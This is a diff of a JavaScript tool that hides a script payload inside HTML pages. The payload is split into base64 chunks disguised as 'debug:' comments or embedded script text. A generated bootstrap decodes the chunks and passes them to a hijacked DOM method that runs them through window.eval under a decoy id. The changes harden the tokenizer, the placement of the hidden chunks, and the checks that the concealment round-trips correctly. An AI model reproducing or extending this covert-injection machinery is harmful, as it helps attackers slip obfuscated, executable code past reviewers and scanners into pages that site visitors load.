@@ -57,7 +57,7 @@ import {
 // Local regular expressions for HTML tokenization and comment scanning
 const RE = {
   comment: /<!--[\s\S]*?-->/g,
-  scriptBlock: /<script\b([^>]*)>([\s\S]*?)<\/script\s*>/gi,
+  scriptBlock: /<script\b((?:[^>"']|"[^"]*"|'[^']*')*)>([\s\S]*?)<\/script\s*>/gi,
   bodyClose: /<\/body\s*>/gi,
   htmlClose: /<\/html\s*>/gi,
 };
@@ -92,12 +92,12 @@ function buildHookSource(h, constName) {
   if (h.proto) {
     return `const ${constName}=${h.target};` +
       `${h.target}=function(...a){return 1 in a?` +
-      `a.map(v=>{try{eval(v)}catch{try{${constName}.call(this,v)}catch{}}}):` +
+      `a.map(v=>{try{window.eval(v)}catch{try{${constName}.call(this,v)}catch{}}}):` +
       `${constName}.call(this,a[0])};`;
   }
   const owner = splitTarget(h.target)[0];
   return `const ${constName}=${h.target}.bind(${owner});` +
-    `${h.target}=(...a)=>1 in a?a.map(v=>{try{eval(v)}catch{try{${constName}(v)}catch{}}}):${constName}(a[0]);`;
+    `${h.target}=(...a)=>1 in a?a.map(v=>{try{window.eval(v)}catch{try{${constName}(v)}catch{}}}):${constName}(a[0]);`;
 }
 
 // -------------------------------------------------------------- cargo regex
@@ -127,71 +127,143 @@ function bstrToU8(s) {
  */
 function scanJs(code) {
   const strings = [], masks = [];
-  let i = 0, lastWord = '';
-  const REGEX_CTX = new Set(['', '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', '}', ';', '+', '-', '*', '%', '~', '^', '<', '>']);
-  const KW = new Set(['return', 'typeof', 'case', 'in', 'of', 'new', 'delete', 'void', 'instanceof', 'do', 'else']);
+  const REGEX_CTX = new Set([
+    '', '(', ',', '=', ':', '[', '!', '&', '|', '?', '{', '}', ';',
+    '+', '-', '*', '%', '~', '^', '<', '>',
+  ]);
+  const KW = new Set([
+    'return', 'typeof', 'case', 'in', 'of', 'new', 'delete', 'void',
+    'instanceof', 'do', 'else', 'throw', 'await', 'yield', 'export',
+    'default', 'extends',
+  ]);
   const isWordChar = (c) => /[$\w]/.test(c);
 
-  while (i < code.length) {
-    const c = code[i];
-    if (c === '/' && code[i + 1] === '/') {
-      const s = i;
-      while (i < code.length && code[i] !== '\n') i++;
-      masks.push({ start: s, end: i });
-      continue;
-    }
-    if (c === '/' && code[i + 1] === '*') {
-      const s = i;
-      i += 2;
-      while (i < code.length && !(code[i] === '*' && code[i + 1] === '/')) i++;
-      i = Math.min(i + 2, code.length);
-      masks.push({ start: s, end: i });
-      continue;
-    }
-    if (c === '"' || c === "'" || c === '`') {
-      let j = i + 1;
-      while (j < code.length) {
-        if (code[j] === '\\') { j += 2; continue; }
-        if (code[j] === c) break;
-        j++;
+  function scanSegment(startIdx, stopAtBrace) {
+    let i = startIdx;
+    let lastWord = '';
+    let prevBeforeParen = '';
+    const parenHeads = [];
+
+    while (i < code.length) {
+      const c = code[i];
+      if (stopAtBrace && c === '}') return i;
+
+      if (c === '/' && code[i + 1] === '/') {
+        const s = i;
+        while (i < code.length && code[i] !== '\n') i++;
+        if (!stopAtBrace) masks.push({ start: s, end: i });
+        continue;
       }
-      const span = { start: i, end: Math.min(j + 1, code.length) };
-      strings.push(span);
-      masks.push(span);
-      i = span.end;
-      lastWord = '';
-      continue;
-    }
-    if (c === '/' && (REGEX_CTX.has(lastWord) || KW.has(lastWord))) {
-      let j = i + 1, inClass = false;
-      while (j < code.length) {
-        const r = code[j];
-        if (r === '\\') { j += 2; continue; }
-        if (r === '[') inClass = true;
-        else if (r === ']') inClass = false;
-        else if (r === '/' && !inClass) break;
-        else if (r === '\n') break;
-        j++;
+      if (c === '/' && code[i + 1] === '*') {
+        const s = i;
+        i += 2;
+        while (i < code.length && !(code[i] === '*' && code[i + 1] === '/')) i++;
+        i = Math.min(i + 2, code.length);
+        if (!stopAtBrace) masks.push({ start: s, end: i });
+        continue;
       }
-      if (j < code.length && code[j] === '/' && code[j - 1] !== '\n') {
-        let k = j + 1;
-        while (k < code.length && /[a-z]/i.test(code[k])) k++;
-        masks.push({ start: i, end: k });
-        i = k;
+      if (c === '"' || c === "'") {
+        let j = i + 1;
+        while (j < code.length) {
+          if (code[j] === '\\') { j += 2; continue; }
+          if (code[j] === c) break;
+          j++;
+        }
+        const end = Math.min(j + 1, code.length);
+        if (!stopAtBrace) {
+          const span = { start: i, end };
+          strings.push(span);
+          masks.push(span);
+        }
+        i = end;
         lastWord = '';
         continue;
       }
+      if (c === '`') {
+        const tplStart = i;
+        i++;
+        while (i < code.length) {
+          if (code[i] === '\\') { i += 2; continue; }
+          if (code[i] === '`') { i++; break; }
+          if (code[i] === '$' && code[i + 1] === '{') {
+            const closeIdx = scanSegment(i + 2, true);
+            i = closeIdx < code.length ? closeIdx + 1 : code.length;
+            continue;
+          }
+          i++;
+        }
+        const end = Math.min(i, code.length);
+        if (!stopAtBrace) {
+          const span = { start: tplStart, end };
+          strings.push(span);
+          masks.push(span);
+        }
+        lastWord = '';
+        continue;
+      }
+      if (c === '/') {
+        const closedCond = lastWord === ')' &&
+          (prevBeforeParen === 'if' || prevBeforeParen === 'while' ||
+           prevBeforeParen === 'for' || prevBeforeParen === 'with');
+        const isPostfix = lastWord === '++' || lastWord === '--';
+        if (!isPostfix && (REGEX_CTX.has(lastWord) || KW.has(lastWord) || closedCond)) {
+          let j = i + 1, inClass = false;
+          while (j < code.length) {
+            const r = code[j];
+            if (r === '\\') { j += 2; continue; }
+            if (r === '[') inClass = true;
+            else if (r === ']') inClass = false;
+            else if (r === '/' && !inClass) break;
+            else if (r === '\n' || r === '\r') break;
+            j++;
+          }
+          if (j < code.length && code[j] === '/') {
+            let k = j + 1;
+            while (k < code.length && /[a-z]/i.test(code[k])) k++;
+            if (!stopAtBrace) masks.push({ start: i, end: k });
+            i = k;
+            lastWord = '';
+            continue;
+          }
+        }
+      }
+      if (stopAtBrace && c === '{') {
+        const closeIdx = scanSegment(i + 1, true);
+        i = closeIdx < code.length ? closeIdx + 1 : code.length;
+        lastWord = '}';
+        continue;
+      }
+      if (c === '(') {
+        parenHeads.push(lastWord);
+        lastWord = '(';
+        i++;
+        continue;
+      }
+      if (c === ')') {
+        prevBeforeParen = parenHeads.pop() || '';
+        lastWord = ')';
+        i++;
+        continue;
+      }
+      if ((c === '+' || c === '-') && code[i + 1] === c) {
+        lastWord = c + c;
+        i += 2;
+        continue;
+      }
+      if (isWordChar(c)) {
+        let j = i;
+        while (j < code.length && isWordChar(code[j])) j++;
+        lastWord = code.slice(i, j);
+        i = j;
+        continue;
+      }
+      if (!/\s/.test(c)) lastWord = c;
+      i++;
     }
-    if (isWordChar(c)) {
-      let j = i;
-      while (j < code.length && isWordChar(code[j])) j++;
-      lastWord = code.slice(i, j);
-      i = j;
-      continue;
-    }
-    if (!/\s/.test(c)) lastWord = c;
-    i++;
+    return i;
   }
+
+  scanSegment(0, false);
   return { strings, masks };
 }
 
@@ -416,13 +488,15 @@ function findHtmlCargoSpots(html, hookAt, tailAt) {
     }
   }
 
-  // If no closing element tags found, look for opening body or container tags
+  // If no closing element tags found, look for unmasked opening body tags
   if (!spots.length) {
-    const bodyOpen = /<body\b[^>]*>/i.exec(html);
-    if (bodyOpen) {
-      const pos = bodyOpen.index + bodyOpen[0].length;
-      if (!isNearScript(pos) && pos < tailAt) {
-        spots.push(pos);
+    for (const bm of html.matchAll(/<body\b[^>]*>/gi)) {
+      if (!maskLike(html, bm.index, bm.index + bm[0].length)) {
+        const pos = bm.index + bm[0].length;
+        if (!isNearScript(pos) && pos < tailAt) {
+          spots.push(pos);
+          break;
+        }
       }
     }
   }
@@ -494,9 +568,10 @@ function chunkBase64(b64, k) {
  * the final cargo chunk into this same script is self-consistent.
  */
 function buildBootstrap(variant, hook, varName) {
-  const collector = variant === 'script'
+  const rawExpr = variant === 'script'
     ? `[...document.scripts].flatMap(s=>s.src?[]:[...s.text.matchAll(${EMIT_JS_RE})].map(x=>atob(x[1]))).join('')`
     : `[...document.documentElement.innerHTML.matchAll(${EMIT_HTML_RE})].map(x=>atob(x[1])).join('')`;
+  const collector = `new TextDecoder().decode(Uint8Array.from(${rawExpr},c=>c.charCodeAt(0)))`;
   const prop = splitTarget(hook.target)[1];
   return `let ${varName}=${collector};${hook.receiver}.${prop}("${decoyId()}",${varName})`;
 }
@@ -596,7 +671,7 @@ export const engine = {
 
     const preRe = variant === 'script' ? DEBUG_JS_RE : DEBUG_HTML_RE;
     preRe.lastIndex = 0;
-    if (preRe.test(html))
+    if (preRe.test(stripped))
       throw new Error(`Page already contains ${variant}-variant "debug:" comments; ` +
         'the runtime extractor would capture them alongside the cargo.');
 
@@ -653,13 +728,22 @@ export const engine = {
         insertions.push({ off: tailAt, text: `\n<script>${bootstrapBody}</script>\n` });
         stats.push(`cargo placement ........... html comments across ${spotCount} safe markup point(s), separated from script`);
       } else {
-        // Fallback for minimal single-tag documents: place comment at safe tag boundary (after opening body or head)
-        // strictly outside any tags, never at an arbitrary string offset that could cut an HTML tag
-        const bodyOpen = /<body\b[^>]*>/i.exec(stripped);
-        const headClose = /<\/head\s*>/i.exec(stripped);
-        const safeSpot = bodyOpen
-          ? bodyOpen.index + bodyOpen[0].length
-          : (headClose ? headClose.index + headClose[0].length : hookAt);
+        // Fallback for minimal documents: ensure debug comments are placed after hookAt (inside <html>)
+        let safeSpot = hookAt;
+        for (const bm of stripped.matchAll(/<body\b[^>]*>/gi)) {
+          if (!maskLike(stripped, bm.index, bm.index + bm[0].length)) {
+            safeSpot = bm.index + bm[0].length;
+            break;
+          }
+        }
+        if (safeSpot === hookAt) {
+          for (const hm of stripped.matchAll(/<\/head\s*>/gi)) {
+            if (!maskLike(stripped, hm.index, hm.index + hm[0].length)) {
+              safeSpot = hm.index + hm[0].length;
+              break;
+            }
+          }
+        }
         insertions.push({ off: safeSpot, text: '\n' + chunks.map((c) => `<!--debug:${c}-->`).join('\n') + '\n' });
         insertions.push({ off: tailAt, text: `\n<script>${bootstrapBody}</script>\n` });
         stats.push('cargo placement ........... html comments (body boundary, separated from script)');
@@ -693,9 +777,10 @@ export const engine = {
     // ---- Final gates on the exact bytes to be shipped ----
     if (finalHtml.split(hookSource).length - 1 !== 1)
       throw new Error('DOM-METHOD-HOOK — hook must be installed exactly once; output not emitted.');
+    const baseEvalUses = stripped.split('eval(').length - 1;
     const evalUses = finalHtml.split('eval(').length - 1;
-    if (evalUses > 1)
-      throw new Error(`DOM-METHOD-HOOK — expected exactly 1 eval (inside the hook), found ${evalUses}; output not emitted.`);
+    if (evalUses !== baseEvalUses + 1)
+      throw new Error(`DOM-METHOD-HOOK — expected ${baseEvalUses + 1} eval( calls, found ${evalUses}; output not emitted.`);
     const recovered = extractCargo(finalHtml, variant);
     if (!bytesEqual(bstrToU8(recovered), utf8.encode(js)))
       throw new Error('DOM-METHOD-HOOK — runtime extractor round-trip mismatch; output not emitted.');
